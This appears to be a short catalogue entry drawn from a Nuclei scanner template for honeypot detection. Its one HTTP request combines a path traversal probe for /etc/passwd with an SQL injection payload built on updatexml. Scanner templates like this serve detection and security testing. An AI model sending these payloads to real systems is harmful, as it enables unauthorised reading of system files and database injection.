# Vulnerability: Honeypot Detection
**Classification:** HONEYPOT
**Source:** Nuclei Template (`honeypot-detect.yaml`)

## Description
Honeypot was Detected.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?{{rand1}}=../../../../../../../../etc/passwd&{{rand3}}=1%20and%20updatexml(1,concat(0x7e,(select%20md5({{rand2}}))),1)
```

